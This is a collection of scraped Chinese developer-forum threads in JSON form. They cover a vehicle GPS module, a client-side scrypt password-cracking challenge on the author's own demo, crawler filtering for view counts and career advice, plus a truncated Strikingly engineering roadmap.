{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个 gps+sim 卡，我想每 3 分钟向我服务器发送一次数据，发送坐标的经纬度！\n有谁有这种设备吗？有接口方便自己开发的那种</p>\n</div></div>"], "reply": "17", "tittle": "哪位大大那儿有 gps 模块，车载的！", "comment": ["淘宝搜 SIM808 ，四五十一块吧，开发简单，用串口就能操作。 AT 指令", "加天线 80 块", "淘宝搜索 OBD", " 需要插 obd 接口是因为用到防盗功能吧(可能还有包括是否自动等)", " AT 指令能算有接口吗？还得自己造一大堆轮子吧", "接口指的是哪边的接口？ \r", "设备端的话，淘宝搜 车载定位啥的 国内做这个的设备不要太多。\r", "服务器的话，现在国外有很多做 IoT 的免费服务器，接口还是挺全的。", " 够简单了…", "关注这个", "老哥 搞追踪黑产？可以", "开公司的话要么直接外包要么雇搞嵌入式开发的行内人，在这儿问能问出个啥", "正在折腾，预估成本 150....\r", "买个现成产品貌似也这个价", "ODB 接口，楼主自己研究吧。", " 谢谢\r", " 谢谢", " 跟 obd 没啥关系", " 淘宝上搜索的 ODB 接口，很少有带二次开发的，都是成品，怎么破", " 这个我也没办法了，我只知道 广州这边有一家 忠诚卫士 专门做这个 OBD 开发的。对了，我记得优酷上面有 OBD 的开发视频，你去搜搜一下，应该可以找到对应的开发板。", " 谢谢我的哥\r", " 感谢我的哥"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天下载 tomcat,一看下载链接有 <a href=\"http://cnnic.cn\" rel=\"nofollow\">cnnic.cn</a> 几个字，打开进去一看，\n几个大字：\n中国互联网络信息中心开源镜像站</p>\n</div></div>"], "reply": "105", "tittle": "无意间发现 CNNIC 也出了开源镜像站", "comment": ["这帖子拐到八丈远了。。。顺便翻页", "吵了这么多……然而并不是他们的目标用户。\r", "这就是给一些官字头的项目提供一个官字头的的源嘛，想要蹭蹭就用，感觉抵触就不用，给自己的选择写一万字的报告，别人不 care 呀……", "都忘了  相同性质的  赛门铁克伪造 Google SSL 证书  大家是怎么表演的。双标可耻。", " \r", "考虑到数学体系不是自然形成而也是由人来发现和理论化的的话，人品不好也可能会有影响：比如把别人的成果窃为己有，自己的论文 /证明过程有错误但是不让别人发表发现自己错误的论文（做法上可以审稿的时候直接枪毙），对和自己思路不同的方法进行打压等等等。\r", "\r", "当然，我说的这些有的是过去常见而现在少了的。不过还是要记住：数学体系不是自然形成的，而是有人来发现、建立和公理化的。", " 因为现在用的密码体系都是基于公开而且成熟的数学体系，所以使用者的人品就可以排除在考虑之外了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如果给你源码，和网站数据库，你是否能破解出来密码？</p>\n<p>都是数字弱密码。</p>\n<p><a href=\"http://www.etherdream.com/webscrypt/example/login/\" rel=\"nofollow\">http://www.etherdream.com/webscrypt/example/login/</a></p>\n<p>破解之后有红包拿，来试试吧</p>\n<p>源码在这里：\n<a href=\"https://github.com/EtherDream/WebScrypt/tree/master/example/login\" rel=\"nofollow\">https://github.com/EtherDream/WebScrypt/tree/master/example/login</a></p>\n</div></div>"], "reply": "22", "tittle": "[来试试] 如果给你源码和数据，你是否能破解出密码？", "comment": ["作者是前端安全专家 @", " \r", "人肉穷举出了最简单的那个,然而很久没用支付宝,不知道口令红包怎么用,留给下位朋友吧,谢谢楼主了.", "给你 sha256 的源码, 除了穷举, 还有别的办法?\r", "如果数字弱密码, 不要源码也能穷举, 拿源码出来干嘛?\r", "毫无意义", "都知道算法了,用字典计算后去撞库就行了,体力活,谁有空谁弄去", "向大佬学习😊", " 这个的意义在于前端防穷举。\r", " 前端提高运算量，防穷举，工程意义大过学术意义，没看懂就瞎嘚瑟", "前端运算，目测是先对密码算一下 hash 这样然后再发送到后端？\r", "\r", "前端都暴露出来了，毫无意义。", "重点在于前端那个 dkHex", "大思路虽然是穷举，但是重点是前端的加密，就像 @", " 说的，前端提高运算量，防穷举，这个需要仔细研究下源码里的算法了：\r", "\r", "var dkHex: String = bytesToHex(CModule.ram, mDkPtr, mDkLen);\r", "\r", "bytesToHex 函数及其三个参数的意义，模拟一个算法，得到 dkHex ，后面的就简单了，加盐比对 sha256 加密密码，穷举。", "前端生成一个 dk 的时间，大概是 1 秒：\r", "\r", "time: 1089\r", "main.js:21 dk: e3ed2afeb0be3bc5f4ddee429a367f99417ac99a40039de1e5bf39ab498627c4", "写了一个简单的 node 穷举程序，还是非常费运算量的。如果 CPU 核心多点并发跑，跑这个题目还是容易的；但如果密码再复杂点就费劲了。", "有点意思，不过最大的意义其实就是把服务器端跑 Scrypt 的消耗丢给了客户端。", " 这个很适合用在网站上，但是貌似手机支持不太友好，可以测试。\r", " 以消耗合适的 cpu 运算来认证前端工作，还能起到验证码的作用。\r", " 正解，如果网站用上，除了防穷举，还能防机器登录（消耗运算增加机器人工作）。\r", "\r", " 意义需要自己理解。", "我需要你的密码明文吗？我只需要你传送什么给后台就可以了。", "发现钓出来好几个脑子都不动就在吹逼的，哈哈哈哈", "这个想法其实不错的。利用 proff of work 来验证客户端的“诚意”\r", "只是老有半桶水程序员想拿这个代替 HTTPS\r", "这是用来做验证码的，不是用来做加密的", "程序已经上了 asm ，算法速度也不好优化了， 6 位数单核跑得几天时间。", "一个简单的 node 穷举程序： ", "\r", "4 位没多久就跑出来了。跑 6 位就太不环保了。", " 赞~然而没什么用哈哈哈哈", "这个代码是我写的，哈哈：） 看到 @", " 破解代码里的链接发现这个帖。。。\r", "\r", "其实拖库后暴力破密码原理都是一样的。不过这个项目的意义就是把 PBKDF 的计算放到浏览器里，节省服务器成本而已。\r", "\r", "另外对于在线撞库，每猜一次密码浏览器都得计算 PBKDF ，很耗资源，所以可以通过 CPU 资源限制攻击频率。", " 惊现原作者~~", "会玩"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>就像 V2 的帖子浏览量统计一样，我最初设想的是每访问一次，数据库的浏览量字段+1 ，但是各种爬虫的访问也带进来了，我想通过排查 header 来验证搜索引擎，但是世界上搜索爬虫这么多，百度、谷歌、 bing 、 Apple 、 yandex 等等，怎样设计一种较为精确的方式，只统计网友访问这个页面的次数？这样便于我统计受欢迎的页面</p>\n</div></div>"], "reply": "14", "tittle": "一个网页的浏览量统计想要更精确点，怎样排除各种搜索引擎爬虫带来的访问量？", "comment": ["让这个统计数，是基于用户手动点击递增", "js 的统计能够过滤掉大部分爬虫(听说 google 会执行部分 js)。\r", "post 提交的能够过滤掉所有靠谱的爬虫。", "js 异步提交统计就可以了，爬虫不会执行 js 脚本，也就是第三方统计的做法，否则只能在后端过滤掉包括 spider 、 bot 等 agent 的请求，但可能不会特别准。", "思路 1 ：一般 bot 会先访问 robots.txt ，你可以认为访问了这个文件的都是 bot 。思路 2 ： bot 的数量是有限的，基本可以枚举出来登记一下。", " 用 webdriver 的爬虫会执行 js 的。", " 搜索引擎应该不会用 webdriver 做爬虫的。", "这样便于我统计受欢迎的页面——只是实现这个目标，完全不用考虑是否爬虫访问，毕竟爬虫爬一次就在所有页面的访问量上+1 （如果真的是放在服务端统计 request 这种方式）", "统计受欢迎的网页不应该只统计访问次数，应该统计网友在此页的停留时间，鼠标移动的轨迹，在网页上是否有选择一些什么的，甚至有表单的要记录键盘操作。\r", "其实统计停留时间可以度就能提高很多了，毕竟搜索引擎的爬虫从来不停留，都是打开了就走。", "百度部分爬虫也会部分执行 js 的(x", "罗列一下大部分常见的 user-agent 就行了，没多少", "Google Analytics 是干啥用的……", "Google 爬虫会执行 JS\r", "\r", "ua 直接排除代“ bot ”三个字母的就搞定了", " #7 爬虫爬一次是看运气的，不一定会爬全站，一个页面可能爬多次\r", "\r", " #6 Google 的能渲染 React ……", " 对于已收录链接，爬虫一般会先 head 一下看看是否有更新，没更新就不会实际 get\r", "另外，类似 google analytic 只有执行了页面渲染才会计数， google 爬虫的渲染应该不包括这种计数 js 吧"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://twitter.com/FabioAntuness/status/831499677522599937\" rel=\"nofollow\">https://twitter.com/FabioAntuness/status/831499677522599937</a></div>"], "reply": "11", "tittle": "所以， StackOverflow 也换 NavBar 了！？", "comment": ["SO 是越改越好， GH 是越改越烂", "嗯是，晚 8 点开了 so 放那，刚刚刷新了下，怎么感觉看着有些不对，仔细看看导航栏变了。", "世界各地掀起了换 Header 的热潮，地球大地处处洋溢着新春的喜悦。", "我司也换了个，跟 GH 的一样颜色， 不知道是不是什么巧合。", "谁丑谁尴尬。", "哇，作为一个程序狗，你们对 UI 的要求这么高吗", "github 和 stackoverflow 果然是程序员的左右手……换导航栏颜色都是对称的", " 哇，为什么作为程序🐶就不能对 UI 要求高了？人类都有审美能力", "新年新气象，改头换面", " stackoverflow / github 还有一堆比 navbar 更糟心得多的设计呢咋不见平时有人吐槽", "这里解释了为什么这样修改： "]},
{"content": ["<div class=\"topic_content\">(之前发错专栏,能删掉吗?)\r<br>先描述下自己的职业路程：\r<br>15 年 10 月在武汉某 VR 公司，负责 unity3D 研发（实习），两个项目单独完成了部分功能，熟练了 AS ， C#。\r<br>\r<br>16 年 06 月，公司武汉部门亏损，决定不招人。完全小白，签的实习协议在公司那，就算离职了。（当时确实不清不白。\r<br>\r<br>16 年 07 月，毕业，没有工作经验，也没要应届生的。感谢带我的师傅给推荐的创业公司，不好意思和家里说就急急落了脚。\r<br>\r<br>16 年 07-11 月，自己确实没经验，待遇什么的只得认（ 986 ， 3K ，没四险，手动忧伤脸）。差不多公司缺什么我就去补， nodejs/geddy 框架，看了两周，就跟着写后台（ linux 下），代码很烂（时间空间复杂度很少考虑。\r<br>自己有个特点大概是，虽然不会，但能想办法完成，这里那里求人，模仿着有的代码，跟着套。（啥活都敢接。\r<br>\r<br>16 年 11 月-至今，单独负责 web 版开发（前后端所有，官网也得自己搞，差什么接口自己去写， nodejs+php+js+h5 。\r<br>app 功能不复杂（定位签到，公告发布，统计分析），没有熟悉什么框架纯靠想象力。\r<br>\r<br>正题：\r<br>因为公司在亏损，想着法子拉业务，要求立马拿出东西，等于基础为零，开始面向商业开发。\r<br>最近 web 版搞定（ 6W 多行吧，但有好的框架，预估可以缩到 4W 行以内）公司用 web 版签了几个合同，周转过来。\r<br>\r<br>当初我很弱的时候公司接受了我，公司很弱的时候我也算帮了一把。\r<br>\r<br>过年的时候发了半个月工资，感觉挺不错的，最近了解，那并不是过年奖金。是一月的工资。 orz\r<br>家里条件贼一般，自己一个月花八九百，其他都补贴家用（打点了些以后会合作的朋友）。以为会发的工资没了，花呗补不上。想走了。\r<br>\r<br>自己的提升很畸形，想换个稍微人性化的公司（有大牛带我，这种野混的日子贼没底气。 996 无所谓，公司项目有起色，自己的产品有亮点，工资在高点，武汉，杭州，上海，深圳。房不指望，但想买个车，可以带着爸妈偶尔出去玩。\r<br>大家觉得我太垃圾还配不上好的待遇。那么我该再补哪些，谢谢指点。\r<br>（大的往架构，小的往算法，为人世道都可以\r<br>（走心建议前提下，随便喷无所谓\r<br>\r<br>\r<br>（题外话：\r<br>自己有玩 kinect 的小项目，有好心人发个 2.0 的实例我看看莫， unity3d 的， kinect2.0 ，商店那个不用了。)\r<br>\r<br>对了明天是情人节，上映了这么多好看的电影，准备和女朋友去看电影，大家有什么好看的\r<br>\r<br>\r<br>\r<br>\r<br>女朋友推荐下哈。</div>"], "reply": "6", "tittle": "新人请教些职业规划的问题，希望大家能指点会，谢谢。", "comment": ["kinect 提示的 usb3.0 是感叹号，确定笔记本是 3.0 接口，驱动也是最新的（ win10 系统）。 kinect 有黑白画面，但和 unity 接不上。求指点。", "辞职，下一题。", "看到\"准备和女朋友去看电影\" 才发现这是个虐狗帖,默默的×掉了....", " 请看仔细，楼主想让你帮忙推荐的是“女朋友”不是电影。。。 [/捂脸]", " 先准备会，算法题什么的都忘的差不多了。\r", "\r", " 大兄弟你看完了一万字，漏掉最后一行-。-\r", "\r", " 那么问题来了，有好看的推荐吗（手动真挚脸）", "毕业后加入创业公司，以为可以锻炼快速提升自己。其实成长并不大，更多的是在自己摸索前进，拿着最底层的薪资，干着乱七八糟的活，还整天担心公司会不会倒掉。\r", "所以，辞职去个正经的公司，一会找不到工作就慢慢找，干拖着没好处。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>github 地址：<a href=\"https://github.com/hustcc/gantt-for-react\" rel=\"nofollow\">https://github.com/hustcc/gantt-for-react</a></p>\n<p>示例地址：<a href=\"http://git.hust.cc/gantt-for-react\" rel=\"nofollow\">http://git.hust.cc/gantt-for-react</a></p>\n<p>因为目前项目中，需要一个查看当前正在做的所有任务，利用甘特图来显示的一个非常不错的做法。但是 github 上已有的 react 甘特图组件太丑了。所以自己封装了一个。目前使用情况良好。</p>\n<p>使用很简单：</p>\n<pre><code>import React from 'react';\nimport ReactGantt from 'gantt-for-react';\n\n&lt;ReactGantt \n    tasks={this.getTasks()} \n    viewMode={this.state.viewMode}\n\n    onClick={this._func} \n    onDateChange={this._func}\n    onProgressChange={this._func}\n    onViewChange={this._func} \n    customPopupHtml={this._html_func} /&gt;\n\n</code></pre>\n<p>原始的甘特图库是 <a href=\"https://github.com/frappe/gantt\" rel=\"nofollow\">https://github.com/frappe/gantt</a>，实用配置文档可以直接参考这个即可。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "封装一个开源的甘特图 react 组件", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文发布于知乎： <a href=\"https://zhuanlan.zhihu.com/p/25229260\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/25229260</a></p>\n<h1>Strikingly 团队 2017 技术展望</h1>\n<p>每年末， Strikingly 技术团队都会回顾过去一年的技术上取得的成果，也会制订新一年的路线图。今年，我们选择把部分内部资料分享出来，希望和社区一起交流一下我们看到的趋势和 2017 年的技术目标。</p>\n<p>关于软件设计，我们一直持有这样一个观点： the core of software development is managing complexity ，软件开发的核心是管理复杂度。 Strikingly 在 2012 年刚上线的时候还只是一个非常典型的，运行在 Heroku 上的 Rails 应用，产品已经初具形态，并拥有一个规模还不错的用户群。随着 4 年多来产品特性、辅助功能的增长和用户数量的增加，整个系统的复杂度日渐成为整个技术团队需要面对并解决的挑战。</p>\n<p>总结下来，我们认为挑战主要来自于以下几点：</p>\n<ul>\n<li>多客户端（ Web, iOS, Android ）支持要求我们保持不同客户端之间的业务逻辑一致性，在产品特性越来越丰富，开发迭代节奏越来越快的情况下，要保持这样的一致性非常困难；</li>\n<li>服务端领域相关（ Domain Specific ）代码体量膨胀，模块数量增多，逻辑复杂度不断增长， Rails 提供的框架和最佳实践已经不能很好地帮助我们设计和组织代码；</li>\n<li>系统整体的复杂性需要复杂可靠的基础设施来支撑，快速迭代的需求也需要我们在基础设施层面更加灵活，需要在云平台的基础上实现高度自动化，尽可能减少人工操作带来的时间开销和出错几率；</li>\n<li>由于建站产品天然的复杂性，在快速迭代的过程要保证尽量不破坏已有的功能，不影响用户的使用，靠 QA 团队来手动测试是不现实的，一次完整的回归测试就要花费一个 QA 团队成员一周的时间，而且这个开销只会越来越大；</li>\n</ul>\n<p>我们很高兴看到，对于以上每一个挑战，我们在过去的一年都已经有了明确的答案，有些已经部分解决，有些已经全部解决，没有解决的部分我们在新的一年继续努力。欢迎大家加入和我们一起努力：<a href=\"https://zhuanlan.zhihu.com/p/25229006\" rel=\"nofollow\">Strikingly 2017 技术团队招聘</a>。</p>\n<h2>导读：</h2>\n<p><strong>对 前端 /iOS/Android 感兴趣的可以阅读：</strong></p>\n<p>第一部分“从前端+移动端到客户端”面向的是做前端和移动端开发的工程师</p>\n<p><strong>对 后端 /DevOps 感兴趣的可以阅读：</strong></p>\n<p>第二部分“服务端架构的思考”包含了我们在后端 API 设计，代码组织和系统架构上的思考</p>\n<p>第三部分“可靠的基础设施”介绍了我们的开发运维团队在基础设施自动化管理和工具开发上的心得</p>\n<p><strong>对 自动化测试 感兴趣的可以阅读：</strong></p>\n<p>第四部分“自动化回归测试”描述了我们摸索出的一套做自动化功能和 UI 回归测试的流程</p>\n<p>希望能够让各种不同职位的工程师和技术管理人员各取所需，更希望能够借此机会跟各个领域的牛人交流心得。</p>\n<h2><strong>从前端+移动端到客户端</strong></h2>\n<p>为了应对多客户端（ Web, iOS, Android ）的挑战， 2016 年我们在团队层面和技术栈上做了很大胆的尝试：我们把前端团队和移动端合并了，组成了客户端团队。这个团队采用同一套基于 React 体系的技术栈去构建 Web 、 iOS 和 Android 应用，可以跨端复用很多业务逻辑代码。这次变革让我们体会到了统一技术栈在开发效率、团队协作和知识共享等方面带来的提升。</p>\n<p>实际合并的过程是 2016 年 5 月开始的，在此之前我们做了很久的铺垫准备。整个过程分为三个阶段：</p>\n<p>第一阶段： React Web</p>\n<p>熟悉我们团队的人应该知道我们在过去两年累积了很多使用 React 开发大型 Web 应用的经验。我们的 Web 应用是一个建站平台（上线了，<a href=\"https://www.sxl.cn/\" rel=\"nofollow\">https://</a><a href=\"https://www.sxl.cn/\" rel=\"nofollow\">www.sxl.cn</a>），整个网站编辑器就是一个交互非常丰富的大型单页应用（ Single Page Application ）。 React 以及其社区的几个核心思想：组件化、单向数据流、纯函数 UI 、不可变数据，大大简化了构建这种大型 Web 应用的过程。我们也想把这种开发体验通过 React Native 带到移动端开发。于是在 16 年 3 月份，我们进入了第二阶段。</p>\n<p>第二阶段： React Native</p>\n<p>在 16 年 5 月，我们开始使用 React Native 构建“上线了” iOS 应用。这款应用可以让用户直接通过手机建立网站，管理商城订单和留言，用户不再需要电脑进行这些操作。在这个应用的开发过程中，我们把 native 和 web 可以共用的代码，包括业务逻辑和通用的工具辅助类代码从原来的 React Web 代码里抽出来，放到 common 目录下方便 native 和 web 复用。整个项目前后花了 3 个月左右就把 iOS 和安卓应用写完了。 iOS 和 Android 代码重用达到了 90%，其中也包括不少 Web 端也可以共用的代码。</p>\n<p>第三阶段：跨平台开发</p>\n<p>基于前两个阶段的铺垫，我们有了比较深厚的 React 开发经验，也写了很多跨平台的业务逻辑。这些业务代码只要接上不同的视图层就可以开发出在不同平台上的应用了：对于 Web 应用，视图层就是 React.js ，对于移动端应用就是 React Native 。两者的开发体验非常类似的，我们甚至可以让同一位开发者去开发 Web ， iOS 和安卓的应用。</p>\n<p>因此，第三阶段我们从团队结构上重新进行了分配。之前，对于每一个功能模块（ feature ），在不同平台上都需要不同的开发者去完成。</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/sRAy4ny.png\"></p>\n<p>而现在，我们可以根据功能模块去分配。一位全端开发者独立把 Web 、 iOS 和安卓平台都做出来。</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/0zwusbz.png\"></p>\n<p>三个阶段总共用了两年时间。从最初听到 Facebook 的工程师畅想着通过 React 可以开发不同平台应用到现在我们团队已经实现了这个目标，我很庆幸这是客户端工程师一个美好的时代。 17 年，我们将基于这个团队结构和技术架构，更快速的做出新功能模块！</p>\n<p>（我司 CTO 在 JSConf 2016 做了一次关于全端团队搭建过程的分享，有兴趣的可以<a href=\"http://2016.jsconf.cn/#/?_k=w7qvoy\" rel=\"nofollow\">在这看视频</a>）</p>\n<h2><strong>服务端架构的思考</strong></h2>\n<h2>GraphQL</h2>\n<p>在构建大型前端应用时，客户端和后端工程师通过 API 的方式进行合作， API 就是双方通信的协议。现在主流的 API 设计范式是 RESTful API ，然而在实践中，我们发现 RESTful 在一些真实业务逻辑的需求下不是很适用。为此我们往往需要构建自定义 API 节点，而这违背了 RESTful 的设计理念。</p>\n<p>我们认为 Facebook 的 GraphQL 是目前最接近完美的解决方法。服务端只需要定义好业务逻辑中设计的数据类型系统，客户端工程师就可以使用 GraphQL 自定义查询的数据及其结构，大大地提升了 API 的灵活性。关于 GraphQL 可以具体解决哪些问题，可以读一下我司 CTO 前年在 CSDN 上发布的<a href=\"http://www.csdn.net/article/2015-08-04/2825370-react\" rel=\"nofollow\">文章</a>，在这就不仔细阐述了。</p>\n<p>自 2015 年 7 月推出 GraphQL 规范到今天，除了 Facebook 之外社区里不乏有些先锋开始陆续使用起来。其中知名的包括有 GitHub ， Pinterest ， Coursera 和<a href=\"http://graphql.org/users/\" rel=\"nofollow\">其他</a>。 Meteor 这家公司也是先锋中的其中一员。 Meteor 作为一家在 Web 应用领域一直有一些超前做法的公司，在 2016 年全力投入了大量资源打造基于 GraphQL 生态系统的 Apollo 。 Facebook 本身也投入了一整个团队把内部的旧 GraphQL 系统升级到对标社区规范的新系统，并发布了几个在实战中使用到的工具。</p>\n<p>鉴于 GraphQL 目前在社区生态上已经比较完善了， 2017 年我们将开始使用 GraphQL 渐渐替换掉内部已有的 RESTful API 。</p>\n<h2>构建复杂的 Rails 应用</h2>\n<p>Strikingly 服务端代码主要是基于 Ruby on Rails 开发的。 Rails 的设计哲学是 <a href=\"http://david.heinemeierhansson.com/2012/rails-is-omakase.html\" rel=\"nofollow\">おまかせ (Omakase)</a>，它提倡和遵循“惯例重于配置”（ Convention over configuration ）的理念，并提供了丰富的工具链，让 Web 开发人员非常容易上手。 Rails 的惯例大多是 Web 开发领域多年总结下来的最佳实践，即使是新手，也能够在短时间内开发出安全，健壮的 Web 应用，这个对于初创企业来说是非常有帮助的。</p>\n<p>但是当应用的逻辑开始变得复杂的时候， Rails 就开始显得力不从心了，它所提供的惯例和最佳实践没有办法再很好地指导开发人员写出具备高可维护性的代码。</p>\n<p>比如说， Rails 的 MVC 里， View 的职责都是非常明确的， Rails 社区也有“ Fat Model, Thin Controller ”这样的指导原则来划分 Controller 的职责，但是 Fat Model 到底给了 Model 什么责任，没有人说得清楚。更多的时候， Fat Model 就意味着但凡不属于 Controller 的责任，一概扔到 Model 里去。一个典型的 Rails 代码结构里，除了 View 和 Controller 之外，业务逻辑也也只能放到 Model 里面去。在领域相关的逻辑代码规模庞大，复杂度高的情况下，如何设计 Model 并保持其代码可读性呢？ Model 在不同的上下文环境中可能有不同的行为，如何处理？涉及两个或两个以上 Model 的逻辑代码应该写在哪个 Model 里？</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/NUoJzqw.png\"></p>\n<p>要解决这问题，我们需要重新审视 Rails 在 Web 应用开发中的定位。 Rails 只是一个 Web 框架，它不是一个应用开发框架，不能也不应该负责 Web 应用中领域相关的部分。我们不妨从 Java 社区借鉴 POJO (Plain Old Java Object) ，引入 PORO (Plain Old Ruby Object) 的概念。</p>\n<p>在我们总结的设计模式中，一个 PORO 对象就是一个普通的 Ruby 对象，它的 initialize 方法除了提供其他 PORO 对象的依赖注入（ DI ， Dependency Injection ）之外不包含任何参数，对象本身也不保留任何状态。在应用中，一个 PORO 对象通过工厂类产生，工厂类负责完成依赖注入，在这个过程中，可能需要调用其他 PORO 的工厂类来产生对象。</p>\n<p>为了解决 Strikingly/上线了应用中不同场景下的不同问题，我们使用了以下 5 类 PORO 对象：</p>\n<ul>\n<li>Service 对象</li>\n<li>Form 对象</li>\n<li>Policy 对象</li>\n<li>Query 对象</li>\n<li>Adapter 对象</li>\n</ul>\n<p><img alt=\"\" src=\"http://i.imgur.com/XgF7fMd.png\"></p>\n<p>Service 对象的功能是描述领域相关逻辑中的操作或过程。比如一个典型的 Web 应用中支持用户注册、登录、登出等操作，有些应用可以支持用户付费升级和取消套餐等等，这些操作都是适合用 Service 对象来描述的。</p>\n<p>Form 对象提供了介于用户界面上的表单和 Model 定义之间的一层封装。 Rails 本身提供了简单易用的表单，但是 Rails 的表单跟相应的 Model 之间有非常强的耦合性，这样等于说把应用的 Model 层实现细节直接暴露给了用户，非常不灵活。 Form 对象替代了真正的 Model 层来作为表单的 Model 层，把用户输入转换成真正的 Model 对象。</p>\n<p>Policy 对象和 Query 对象相对比较简单，它们分别定义了封装权限检测逻辑和数据查询逻辑的对象。</p>\n<p>Adapter 对象提供了介于应用内部领域相关接口和应用外部依赖接口之间的一层封装。应用内部领域相关的逻辑应该有自己固定的接口并不与外部依赖接口之间产生强耦合关系。比如 Strikingly 提供域名的购买和管理服务，这个服务提供了域名查询、购买、验证、续费、取消等操作，这些操作都是域名这个领域内的“标准操作”，并不依赖于我们的上级域名提供商。我们应该允许上级域名提供商修改它们的 API ，允许切换到另一个上级域名提供商，甚至支持多个上级域名提供商。在有 Adapter 这一层封装之后，我们可以做以上这些更改而不需要更改任何域名领域内的操作代码，需要修改的仅仅是 Adapter 对象的代码而已。</p>\n<p>今后随着系统的复杂性进一步增加，我们可能会使用更多的 PORO 对象类型来解决新的问题。我们相信，通过这种方式，可以有效地降低我们系统内部模块之间的耦合性，使得代码的可维护性大大增强，也更方便我们编写高效的测试代码。</p>\n<p>关于这一部分的详细内容可以参考我们团队的资深 Rails 工程师 Florian Dutey 在 RubyConf Taiwan 2016 上的演讲 “<a href=\"https://www.youtube.com/watch?v=vokjrQwTIQM\" rel=\"nofollow\">Large scale Rails applications</a>”。</p>\n<h2>微服务架构的演进方向</h2>\n<p>PORO 对象和依赖注入可以很大程度解决系统复杂性造成的可维护性问题，但是系统规模和用户数目的增加还带来了其他问题。</p>\n<p>首当其冲的就是用户网站的高可用性。 Strikingly 建站产品的特性决定了用户会对自己的网站有较高的可用性要求，对网站的管理平台和编辑器的可用性则没有很高的要求。这就需要需要从系统层面做切分，对用户网站所依赖的功能提供不同于管理平台和编辑器的可用性保证。</p>\n<p>其次，应用中的每个模块都有自己独特的流量特性，而单一应用则决定了比较单一的技术栈和通信、数据存储等方面服务的选择。例如用户网站的流量特性就跟管理平台和编辑器的流量特性完全不一样，即使在用户网站中，不同的功能模块因为功能的区别和使用率的不同，流量特性也不完全一样。如果能够对于每个模块采用各自最适合的技术方案，就可以最大化模块的性能。</p>\n<p>再者，单体应用导致所有大大小小的改动都必须重新部署整个代码库，而为了保证新代码的正确性，部署之前需要对整个项目的前端和后端代码进行自动化测试，整个流程持续时间很长。每个小的改动都重新部署整个代码库代价太大，而如果降低部署的频率的话又会在一定程度上影响迭代效率。</p>\n<p>解决这些问题的有效方案是将目前的单体应用合理地拆分成为多个微服务，这是我们服务端团队 2017 年的主要目标。例如，所有用户网站相关的服务都会被拆分出来作为微服务，并且每一类网站模块所依赖的服务都会成为单独的微服务。这样可以保证用户网站整体的高可用性，可以允许因为后台维护的原因出现某个服务短时间不可用，极大地降低网站整体上服务不可用的情况的出现。在微服务架构下我们可以为不同的服务选择不同的技术方案，并且各个服务可以分开部署。由于每个服务都非常小，测试和部署需要花费的时间非常短，可以极大地提升迭代效率。</p>\n<h2><strong>可靠的基础设施</strong></h2>\n<p>Strikingly 最初是部署在 PaaS 平台 Heroku 上的， Heroku 负责分配和管理下层基础设施，我们只需要关注在应用本身。 2014 年我们从 Heroku 迁移出来，直接基于 AWS 构建服务。当时我们引入了刚刚兴起的 Docker 容器技术作为应用的打包部署方案，应该说是比较前卫的，但是在 AWS 基础设施的管理上，包括 EC2 ， VPC ， Subnet 的分配和设置等等，还是采用手动管理的方式，在计算资源需要伸缩的时候也是通过手动方式进行操作。这样的管理方式带来了不少问题。</p>\n<p>首先，手动操作容易造成操作错误，尤其是在维护正在运行应用的基础设施的过程中，如果不小心关掉了某台服务器或者设置网络的时候规则设置错误，都可能造成服务中断，影响用户使用。</p>\n<p>其次，手动操作效率比较低。我们除了生产环境之外，还有多个沙盒环境供线上测试使用。为了保证测试的有效性，这些沙盒环境都要做到尽量跟生产环境一致。对于一个运维工程师来说，手动创建完成并测试通过一个沙盒环境往往需要 2 ～ 3 天的时间，并且无法完全保证这个沙盒环境和生产环境的一致性。</p>\n<p>再次，生产环境和沙盒环境的当前状态非常不透明，即使使用文档记录了环境创建的操作步骤和当前的状态，也很难保证文档和环境之间一直保持同步。这样我们就无法有效地了解当前的环境是否符合我们的预期，很可能会出现考虑不周全的情况。</p>\n<p>为了解决这些问题，我们需要更有效的方式来管理我们的基础设施。</p>\n<h2>基础设施即代码</h2>\n<p>我们选择的解决问题的方向是基础设施即代码（ Infrastructure as Code ）。所谓基础设计即代码，就是指开发和运维工程师不再使用手动方式或者过程式的脚本来分配管理基础设施，而是采用声明式的代码来定义基础设施，这里的代码既可以作为定义基础设施的文档，也可以运行来完成基础设施的配置，还可以作为自动化测试的 spec 来测试当前的基础设施配置是否符合预期。</p>\n<p>基础设施即代码提供一种全新的方式来看待云计算时代的运维工作。传统的 IDC 时代，很多运维工作需要通过手工的方式来完成，手工操作的缺点在上文已经提过了。有一些自动化意识比较强的公司和个人，会采用过程式的脚本来自动化大部分的运维工作，确实减少了手工操作带来错误的可能性以及带来了效率的提升。但是复杂的脚本同样带来了不透明的问题：你怎么确定这个脚本运行的结果是符合预期的？如何测试脚本的正确性？如何保证脚本运行的幂等性？</p>\n<p>基础设施即代码通过声明式的配置代码解决了这些问题。这些配置定义了我们所期望的状态，而运行这些配置的过程，则是不断地检测特定的计算资源是否符合定义，如果不符合，则通过调用云平台的 API 来操作使得该计算资源符合定义。</p>\n<p>我们最初选择了 Ansible 作为配置基础设施和自动化部署的解决方案，基于 Ansible 设计和实现了一整套运维工具。这套工具帮助我们实现了两个重要的目标：</p>\n<ul>\n<li>任何一个工程师都能够简单地使用这套工具来部署／回滚，而不需要了解任何底层的实现细节</li>\n<li>可以高效地复制一套新的生产／沙盒环境而不需要太多的手动操作</li>\n</ul>\n<p>第二点在我们准备在 AWS 中国区域推出“上线了”服务的时候起到了很大的作用，我们几乎一键完成了整个生产环境和几个沙盒环境的基础设施配置，并且照搬了整个应用部署／回滚的方案，节约了大量的时间。</p>\n<p>随着系统复杂度的增加，我们渐渐发现 Ansible 虽然在实现自动化部署方面很好用，但在定义和配置基础设施上并不那么方便，不能完全解决上面提到的 3 个问题。经过研究和比较，我们选择了 Terraform 作为新的基础设施配置解决方案，并使用 Terraform 